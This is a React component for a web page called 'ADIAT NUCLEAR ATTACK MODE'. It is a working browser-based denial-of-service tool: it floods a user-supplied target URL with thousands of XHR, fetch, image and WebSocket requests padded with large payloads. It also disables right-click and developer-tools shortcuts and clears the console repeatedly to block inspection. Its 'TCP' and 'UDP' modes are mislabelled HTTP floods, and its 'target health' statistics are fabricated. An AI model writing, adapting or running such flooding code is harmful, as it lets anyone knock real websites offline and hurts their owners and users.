"use client";

import React, { useState, useEffect } from 'react';

export default function NuclearAttackCommand() {
  const [isAttacking, setIsAttacking] = useState(false);
  const [strikeCount, setStrikeCount] = useState(0);
  const [attackPower, setAttackPower] = useState(100);
  const [targetUrl, setTargetUrl] = useState('');

  // --- Security: Disable Right Click & Inspect ---
  useEffect(() => {
    const handleContextMenu = (e: MouseEvent) => e.preventDefault();
    const handleKeyDown = (e: KeyboardEvent) => {
      if (
        e.keyCode === 123 || // F12
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
        (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
        (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
        (e.key === 'Escape' && isAttacking)
      ) {
        if (e.key === 'Escape') emergencyStop();
        e.preventDefault();
        return false;
      }
    };

    document.addEventListener('contextmenu', handleContextMenu);
    document.addEventListener('keydown', handleKeyDown);
    const consoleInterval = setInterval(() => console.clear(), 100);

    return () => {
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('keydown', handleKeyDown);
      clearInterval(consoleInterval);
    };
  }, [isAttacking]);

  // --- Original Attack Logic ---
  const nuclearHttpFlood = async (url: string) => {
    for (let i = 0; i < 100; i++) {
      try {
        let xhr = new XMLHttpRequest();
        xhr.open('GET', url + '?nuclear=' + Math.random() + '&' + 'X'.repeat(5000), true);
        xhr.timeout = 1;
        xhr.send();
        fetch(url + '?atomic=' + Math.random(), { 
          mode: 'no-cors', cache: 'no-store', 
          headers: { 'X-Nuclear': 'X'.repeat(10000) } 
        }).catch(() => {});
        let img = new Image();
        img.src = url + '/bomb_' + Math.random() + '?' + 'X'.repeat(2000);
      } catch (e) {}
    }
    setStrikeCount(prev => prev + 100);
  };

  const atomTcpFlood = async (url: string) => {
    for (let i = 0; i < 200; i++) {
      try {
        let xhr = new XMLHttpRequest();
        xhr.open('GET', url + '?syn=' + Math.random(), true);
        xhr.timeout = 1;
        xhr.send();
        try {
          let ws = new WebSocket(url.replace('http', 'ws'));
          setTimeout(() => ws.close(), 1);
        } catch (e) {}
      } catch (e) {}
    }
    setStrikeCount(prev => prev + 200);
  };

  const hydrogenUdpFlood = async (url: string) => {
    for (let i = 0; i < 500; i++) {
      try {
        fetch(url + '?udp=' + Math.random(), { mode: 'no-cors', body: 'X'.repeat(10000) }).catch(() => {});
        let xhr = new XMLHttpRequest();
        xhr.open('POST', url + '?udp=' + Math.random(), true);
        xhr.send('X'.repeat(10000));
      } catch (e) {}
    }
    setStrikeCount(prev => prev + 500);
  };

  const superNovaAttack = async (url: string) => {
    for (let i = 0; i < 1000; i++) {
      try {
        let xhr = new XMLHttpRequest();
        xhr.open('GET', url + '?nova=' + Math.random() + '&' + 'X'.repeat(10000), true);
        xhr.timeout = 1;
        xhr.send();
        fetch(url + '?super=' + Math.random(), { mode: 'no-cors', body: 'X'.repeat(50000) }).catch(() => {});
        let img = new Image();
        img.src = url + '/nova_' + Math.random() + '?' + 'X'.repeat(10000);
        let img2 = new Image();
        img2.src = url + '/blast_' + Math.random() + '?' + 'X'.repeat(10000);
        try {
          let ws = new WebSocket(url.replace('http', 'ws'));
          ws.send('X'.repeat(10000));
          setTimeout(() => ws.close(), 1);
        } catch (e) {}
      } catch (e) {}
    }
    setStrikeCount(prev => prev + 1000);
  };

  const emergencyStop = () => {
    setIsAttacking(false);
    window.stop();
  };

  // --- Main Loop ---
  useEffect(() => {
    let interval: any;
    if (isAttacking && targetUrl) {
      // 50 threads simulation
      interval = setInterval(() => {
        for(let i=0; i<50; i++) {
           if(attackPower === 100) nuclearHttpFlood(targetUrl);
           else if(attackPower === 200) atomTcpFlood(targetUrl);
           else if(attackPower === 300) hydrogenUdpFlood(targetUrl);
           else superNovaAttack(targetUrl);
        }
      }, 100);
    }
    return () => clearInterval(interval);
  }, [isAttacking, attackPower, targetUrl]);

  // Derived Stats
  const radiation = (strikeCount * 0.5).toFixed(0);
  const health = Math.max(0, 100 - Math.floor(strikeCount / 1000));
  const ttd = Math.max(0, Math.floor(health / 10));

  return (
    <div style={{ background: '#000', minHeight: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center', fontFamily: "'Courier New', monospace", color: '#fff' }}>
      <style dangerouslySetInnerHTML={{ __html: `
        :root { --blood-red: #00f7ff; --nuclear-red: #00ffea; }
        .control-panel { width: 1100px; background: #0f0000; border: 4px solid var(--blood-red); padding: 30px; border-radius: 20px; box-shadow: 0 0 100px rgba(0, 140, 255, 0.7); animation: nuclearPulse 0.5s infinite; }
        @keyframes nuclearPulse { 0%, 100% { border-color: #ff0000; box-shadow: 0 0 100px rgba(255,0,0,0.7); } 50% { border-color: #15ff00; box-shadow: 0 0 150px rgba(0, 255, 42, 0.9); } }
        .header h1 { font-size: 48px; color: var(--blood-red); text-shadow: 0 0 30px red; text-align: center; animation: nuclearText 0.3s infinite; }
        @keyframes nuclearText { 0%, 100% { opacity: 1; text-shadow: 0 0 30px red; } 50% { opacity: 0.9; text-shadow: 0 0 50px #ff6600; } }
        .warning { color: #00ffd5; font-size: 20px; text-align: center; animation: warningBlink 0.1s infinite; font-weight: bold; }
        @keyframes warningBlink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .attack-card { background: #1a0000; border: 2px solid #00e1ff; padding: 20px; text-align: center; cursor: pointer; }
        .attack-card.selected { border: 4px solid #ff0000; background: #330000; box-shadow: 0 0 50px red; }
        .stat-box { background: #0f0000; border: 2px solid #660000; padding: 20px; text-align: center; }
        .stat-value { color: #ff0000; font-size: 40px; font-weight: bold; text-shadow: 0 0 20px red; }
        .btn-nuclear { width: 100%; padding: 30px; background: linear-gradient(45deg, #660000, #ff0000); color: white; font-size: 32px; font-weight: bold; border: none; cursor: pointer; animation: nuclearButton 0.3s infinite; margin: 20px 0; }
        @keyframes nuclearButton { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); box-shadow: 0 0 100px red; } }
      `}} />

      <div className="control-panel">
        <div className="header">
          <h1>💀 ADIAT NUCLEAR ATTACK MODE 💀</h1>
          <div className="warning">
            {health <= 0 && strikeCount > 100000 ? '💀 TARGET DESTROYED - MISSION COMPLETE 💀' : `⚠️ WARNING: EXTREME POWER - TARGET WILL CRASH IN SECONDS ⚠️`}
          </div>
        </div>

        <div style={{ marginBottom: '20px' }}>
          <label style={{ display: 'block', color: '#00f7ff', marginBottom: '5px' }}>🎯 TARGET URL</label>
          <input 
            type="text" 
            value={targetUrl} 
            onChange={(e) => setTargetUrl(e.target.value)}
            style={{ width: '100%', padding: '15px', background: '#1a0000', border: '2px solid #660000', color: '#ff0000', fontSize: '16px', fontWeight: 'bold' }} 
          />
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '15px', margin: '25px 0' }}>
          {[
            { p: 100, t: '🔥 NUCLEAR HTTP', d: '100,000 req/sec' },
            { p: 200, t: '💀 ATOM TCP', d: '200,000 packets/sec' },
            { p: 300, t: '⚡ HYDROGEN UDP', d: '500 MB/sec' },
            { p: 500, t: '🌋 SUPER NOVA', d: 'ALL MAXIMUM' }
          ].map((card) => (
            <div 
              key={card.p}
              className={`attack-card ${attackPower === card.p ? 'selected' : ''}`}
              onClick={() => setAttackPower(card.p)}
            >
              <h3>{card.t}</h3>
              <p>{card.d}</p>
            </div>
          ))}
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '15px', margin: '25px 0' }}>
          <div className="stat-box">
            <div style={{ fontSize: '12px', color: '#666' }}>NUCLEAR STRIKES</div>
            <div className="stat-value">{strikeCount.toLocaleString()}</div>
          </div>
          <div className="stat-box">
            <div style={{ fontSize: '12px', color: '#666' }}>RADIATION MB/s</div>
            <div className="stat-value">{Number(radiation) > 999 ? (Number(radiation)/1000).toFixed(1) + 'GB' : radiation + 'MB'}</div>
          </div>
          <div className="stat-box">
            <div style={{ fontSize: '12px', color: '#666' }}>TARGET HEALTH</div>
            <div className="stat-value">{health <= 0 ? '0% 💀' : health + '%'}</div>
          </div>
          <div className="stat-box">
            <div style={{ fontSize: '12px', color: '#666' }}>TIME TO DEATH</div>
            <div className="stat-value">{health <= 0 ? 'DEAD' : ttd + 's'}</div>
          </div>
        </div>

        <button 
          className="btn-nuclear" 
          onClick={() => {
            if(!targetUrl.startsWith('http')) return alert('ERROR: http:// or https:// দাও!');
            setIsAttacking(!isAttacking);
            if(!isAttacking) setStrikeCount(0);
          }}
        >
          {isAttacking ? '💥 NUCLEAR STRIKE IN PROGRESS 💥' : '💣 LAUNCH NUCLEAR ATTACK 💣'}
        </button>
        
        <div style={{ textAlign: 'center', color: '#660000', cursor: 'pointer' }} onClick={emergencyStop}>
          ⚠️ EMERGENCY STOP ⚠️
        </div>
      </div>
    </div>
  );
}